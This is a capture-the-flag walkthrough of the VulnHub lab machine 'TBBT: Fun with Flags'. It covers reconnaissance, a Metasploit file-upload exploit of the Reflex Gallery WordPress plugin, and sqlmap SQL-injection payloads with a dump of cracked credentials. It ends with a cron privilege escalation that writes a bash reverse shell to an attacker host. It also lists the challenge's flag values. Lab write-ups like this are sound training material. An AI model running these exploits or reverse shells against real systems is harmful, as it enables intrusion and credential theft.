# TBBT: Fun with Flags — VulnHub

## 1. Identification

| Field            | Value                                                                  |
|------------------|------------------------------------------------------------------------|
| Machine name     | TBBT: Fun with Flags (a.k.a. FunWithFlags)                             |
| Author           | emaragkos                                                              |
| Platform         | VulnHub                                                                |
| Theme            | The Big Bang Theory — fictional company "BigPharmaCorp"               |
| Difficulty       | Easy/Medium (boot2root + CTF)                                          |
| Target IP (lab)  | 10.0.0.20                                                              |
| Goal             | 7 character flags (Sheldon, Amy, Penny, Howard, Raj, Leonard, Bernadette) + root |

The machine is a hybrid: a flag-hunt (one flag per *The Big Bang Theory* character) layered on a classic boot2root. The seven flags are scattered across a banner service, a WordPress instance, two MySQL databases, an FTP share, and the root filesystem; root is obtained via a writable cron script.

Narrative hint preserved in the local files:

```
Penny the IT department from my Pharmaceutical company opened you an account in the
B2B website. You need to go there ASAP and learn our drugs for your interview
tomorrow.

Username: penny69
Password: cant post it here as sheldon said. you know the password. you use it
everywhere.

SHELDON DONT CHANGHE IT AGAIN OK!?!?!
THIS IS THE ONLY PASSWORD I CAN REMEMBER
wifipassword: pennyisafreeloader
```

> Classic password-reuse hint. In practice the decisive credentials on this box come from configuration files (`db_config.php`, `wp-config.php`) and a cracked ZIP, not from this note.

## 2. Initial reconnaissance

```bash
nmap -A -p- 10.0.0.20
```

Result recorded in the local files:

```
Host is up (0.16s latency).
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
22/tcp open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7
53/tcp filtered domain
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
Running: Linux 3.X|4.X
```

> **Reported by public writeups — not locally verified:** the public walkthroughs of this box also report an extra service on **1337/tcp**. nmap cannot fingerprint it, but connecting to it returns the first flag directly (see § 4). It does not appear in the locally preserved scan above; treat it as an additional port to probe.

## 3. Web enumeration

### 3.1 Gobuster / dirb — directory discovery

```bash
gobuster dir -u http://10.0.0.20 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -s 200,301
```

```
index.html           (Status: 200)
javascript           (Status: 301)
music                (Status: 301)
phpmyadmin           (Status: 301)
private              (Status: 301)
robots.txt           (Status: 200)
```

Two branches matter: `/music/` (hosts a WordPress install at `/music/wordpress/`) and `/private/` (the BigPharmaCorp B2B portal).

### 3.2 robots.txt — additional hints

```
User-Agent: *
Disallow:
Disallow: /howard
Disallow: /web_shell.php
Disallow: /backdoor
Disallow: /rootflag.txt
```

### 3.3 Gobuster on /private/

```bash
gobuster dir -u http://10.0.0.20/private/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html
```

```
.hta / .htaccess / .htpasswd   → 403
css                             → 301
index.php                       → 200
login.php                       → 200
```

### 3.4 Login page

At `http://10.0.0.20/private/login.php` the page reads "Login Page - Login using the credentials provided by IT department" (BigPharmaCorp):

Figure 1 — `http://10.0.0.20/private/login.php` — authentication form for the "BigPharmaCorp" B2B portal (The Big Bang Theory theme).

![BigPharmaCorp B2B login page](assets/TBBT_Fun_with_Flags/image-01.png)

> The form's `searchitem` parameter is SQL-injectable — this is the locally verified path to the Bernadette flag (see § 7).

## 4. Flag 1 — Sheldon (banner on 1337/tcp)

> **Reported by public writeups — not locally verified.**

Connecting to the unidentified service on `1337/tcp` returns the Sheldon flag directly in the banner:

```bash
nc 10.0.0.20 1337
```

```
FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
```

## 5. Foothold — WordPress `reflex-gallery` arbitrary file upload

> **Reported by public writeups — not locally verified.**

The WordPress instance under `/music/wordpress/` runs the vulnerable **Reflex Gallery 3.1.3** plugin (arbitrary file upload, no authentication required).

```bash
wpscan --url http://10.0.0.20/music/wordpress/ --enumerate vp
```

Exploited with Metasploit:

```
msf6 > use exploit/unix/webapp/wp_reflexgallery_file_upload
msf6 > set RHOSTS 10.0.0.20
msf6 > set TARGETURI /music/wordpress/
msf6 > set LHOST <ATTACKER_IP>
msf6 > run
```

This yields a Meterpreter session as `www-data`, giving filesystem access to the user home directories used by the next flags.

## 6. Flag 2 — Amy (`strings` on a binary)

> **Reported by public writeups — not locally verified.**

In `/home/amy/` there is a binary named `secretdiary`. Running `strings` over it exposes both a password and the embedded flag:

```bash
strings /home/amy/secretdiary
```

```
FLAG-amy{60263777358690b90e8dbe8fea6943c9}
```

## 7. Flag 3 — Penny (base64 in a hidden file)

> **Reported by public writeups — not locally verified.**

`/home/penny/.FLAG.penny.txt` contains a base64 string:

```bash
cat /home/penny/.FLAG.penny.txt
# RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0=

echo 'RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0=' | base64 -d
```

```
FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
```

## 8. Flag 4 — Bernadette (SQLi → BigPharmaCorp DB)  ✅ locally verified

This is the branch performed and recorded locally.

### 8.1 Login bypass / injectable parameter

The `searchitem` parameter on `/private/login.php` (POST) is SQL-injectable.

### 8.2 sqlmap

```bash
sqlmap -u "http://10.0.0.20/private/login.php" \
  --data="searchitem=test" --dbs --batch
```

Preserved output (detected parameters and payloads):

```
Parameter: searchitem (POST)
   Type: boolean-based blind
   Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
   Payload: searchitem=-8808' OR 3588=3588#

   Type: error-based
   Title: MySQL >= 5.1 AND error-based ... (EXTRACTVALUE)
   Payload: searchitem=test' AND EXTRACTVALUE(1387,CONCAT(0x5c,...))-- PuYV

   Type: time-based blind
   Payload: searchitem=test' AND (SELECT 8223 FROM (SELECT(SLEEP(5)))ftEy)-- ZLYA

   Type: UNION query
   Title: MySQL UNION query (NULL) - 5 columns
```

Discovered databases:

```
[*] bigpharmacorp
[*] information_schema
```

Tables in `bigpharmacorp`:

```
+----------+
| products |
| users    |
+----------+
```

Dump of the `users` table (with automatic MD5 hash cracking):

```
+----+------------+----------------------------------------------+------------+
| id | fname      | password                                     | username   |
+----+------------+----------------------------------------------+------------+
| 1  | josh       | 3fc0a7acf087f549ac2b266baf94b8b1 (qwerty123) | admin      |
| 2  | bob        | 8cb1fb4a98b9c43b7ef208d624718778             | bobby      |
| 3  | penny      | cafa13076bb64e7f8bd480060f6b2332             | penny69    |
| 4  | dimitris   | 05d51709b81b7e0f1a9b6b4b8273b217 (souvlaki)  | mitsos1981 |
| 5  | alice      | e146ec4ce165061919f887b70f49bf4b             | alicelove  |
| 6  | bernadette | dc5ab2b32d9d78045215922409541ed7 (howard)    | bernadette |
+----+------------+----------------------------------------------+------------+
```

Preserved key findings:

```
cracked: 'howard'    → user 'bernadette'
cracked: 'qwerty123' → user 'admin'
cracked: 'souvlaki'  → user 'mitsos1981'
```

### 8.3 The flag

The `description` row for user `bernadette` contains the flag:

```
FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
```

### 8.4 DB credentials on disk

The web root also exposes the DB connection file, which is the pivot used for the Raj flag (§ 9):

```bash
cat /var/www/html/private/db_config.php
# user = bigpharmacorp
# pass = weareevil
```

## 9. Flag 5 — Raj (WordPress DB)

> **Reported by public writeups — not locally verified.** Note the author spells this flag `FLAG-raz` (not `raj`).

`wp-config.php` reveals a second set of MySQL credentials:

```bash
cat /var/www/html/music/wordpress/wp-config.php
# DB_USER = footprintsonthemoon
# DB_PASSWORD = footprintsonthemoon1337
```

```bash
mysql -u footprintsonthemoon -p
# use footprintsonthemoon;
# show tables;
# select * from wp_posts;
```

The flag is stored inside a WordPress post:

```
FLAG-raz{40d17a74e28a62eac2df19e206f0987c}
```

## 10. Flag 6 — Howard (FTP → ZIP crack → steganography)

> **Reported by public writeups — not locally verified.**

Anonymous FTP exposes a password-protected archive:

```bash
ftp 10.0.0.20            # anonymous
cd pub/howard
get super_secret_nasa_stuff_here.zip
```

Crack the ZIP password (`astronaut`) and extract the image:

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt super_secret_nasa_stuff_here.zip
# PASSWORD FOUND!!!!: pw == astronaut
unzip super_secret_nasa_stuff_here.zip      # -> marsroversketch.jpg
```

Recover the hidden data with steganography (passphrase `iloveyoumom`):

```bash
stegcracker marsroversketch.jpg /usr/share/wordlists/rockyou.txt
# passphrase: iloveyoumom
cat marsroversketch.jpg.out
```

```
FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}
```

> Note: the `astronaut` value also appears in the locally preserved sqlmap notes (`PASSWORD FOUND!!!!: pw == astronaut`), consistent with this ZIP-cracking step.

## 11. Privilege escalation + Flag 7 — Leonard (root via cron)

> **Reported by public writeups — not locally verified.**

`/home/leonard/thermostat_set_temp.sh` is writable and is executed every minute as **root** via cron:

```bash
cat /etc/crontab
# * * * * * root /home/leonard/thermostat_set_temp.sh
```

Overwrite it with a reverse shell and wait for the next minute:

```bash
msfvenom -p cmd/unix/reverse_bash lhost=<ATTACKER_IP> lport=1234 R
# append/replace the script body with the generated bash one-liner
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/1234 0>&1"' > /home/leonard/thermostat_set_temp.sh
```

```bash
nc -lvnp 1234      # catches a root shell on the next cron tick
```

As root, read the final flag:

```bash
cat /root/Flag-leonard.txt
```

```
FLAG-leonard{17fc95224b65286941c54747704acd3e}
```

## 12. Flags

| # | Character  | Location                                        | Value                                                | Verification               |
|---|------------|-------------------------------------------------|------------------------------------------------------|----------------------------|
| 1 | Sheldon    | `1337/tcp` banner                               | `FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}`     | public writeups            |
| 2 | Amy        | `strings /home/amy/secretdiary`                 | `FLAG-amy{60263777358690b90e8dbe8fea6943c9}`         | public writeups            |
| 3 | Penny      | `/home/penny/.FLAG.penny.txt` (base64)          | `FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}`       | public writeups            |
| 4 | Bernadette | `bigpharmacorp.users.description` (SQLi)        | `FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}`  | **locally verified ✅**    |
| 5 | Raj        | `footprintsonthemoon` WP DB → `wp_posts`        | `FLAG-raz{40d17a74e28a62eac2df19e206f0987c}`         | public writeups            |
| 6 | Howard     | FTP ZIP → stego on `marsroversketch.jpg`        | `FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}`      | public writeups            |
| 7 | Leonard    | `/root/Flag-leonard.txt` (root via cron)        | `FLAG-leonard{17fc95224b65286941c54747704acd3e}`     | public writeups            |

| Credential                                        | Value                       | Source                  |
|---------------------------------------------------|-----------------------------|-------------------------|
| `admin / qwerty123`                               | BigPharmaCorp web app       | sqlmap dump (local)     |
| `bernadette / howard`                             | BigPharmaCorp web app       | sqlmap dump (local)     |
| `mitsos1981 / souvlaki`                           | BigPharmaCorp web app       | sqlmap dump (local)     |
| `bigpharmacorp / weareevil`                       | MySQL (`db_config.php`)     | local file              |
| `footprintsonthemoon / footprintsonthemoon1337`  | MySQL (`wp-config.php`)     | public writeups         |
| ZIP password `astronaut`                          | `super_secret_nasa_stuff_here.zip` | fcrackzip        |
| Stego passphrase `iloveyoumom`                    | `marsroversketch.jpg`       | stegcracker             |

## 13. Attack summary

1. Nmap → FTP/SSH/HTTP on 10.0.0.20; public writeups add `1337/tcp`.
2. `1337/tcp` banner → **Sheldon** flag.
3. Gobuster → `/music/wordpress/`, `/private/`, `/phpmyadmin/`; `robots.txt` reveals `/howard`, `/backdoor`, `/web_shell.php`, `/rootflag.txt`.
4. WordPress **Reflex Gallery 3.1.3** arbitrary file upload (Metasploit) → `www-data` shell.
5. `/home/amy/secretdiary` → `strings` → **Amy** flag.
6. `/home/penny/.FLAG.penny.txt` → base64 decode → **Penny** flag.
7. SQLi on `/private/login.php` (`searchitem`) → sqlmap dump → **Bernadette** flag in the `description` column. *(locally verified)*
8. `wp-config.php` creds (`footprintsonthemoon`) → WordPress DB `wp_posts` → **Raj** (`FLAG-raz`) flag.
9. Anonymous FTP → `super_secret_nasa_stuff_here.zip` → crack with `astronaut` → `stegcracker` (`iloveyoumom`) → **Howard** flag.
10. Writable root cron script `/home/leonard/thermostat_set_temp.sh` → reverse shell as root → **Leonard** flag in `/root/Flag-leonard.txt`.

## 14. Technical lessons

- Always probe non-standard ports (here `1337`) by hand — a service nmap can't fingerprint may still hand out data on connect.
- Subdirectory enumeration plus `robots.txt` exposes sensitive paths (a classic anti-pattern).
- Outdated WordPress plugins (Reflex Gallery 3.1.3) provide unauthenticated file-upload footholds.
- Credentials live in config files on disk (`db_config.php`, `wp-config.php`) — read the web root once you have a shell.
- Layered "treasure hunt" artifacts: `strings` on a binary, base64 in a dotfile, a flag in a DB column, a flag in a WordPress post, and a stego-protected image inside a password-protected ZIP.
- Privilege escalation here is a textbook writable-cron-script-running-as-root issue: enumerate `/etc/crontab` and file permissions early.
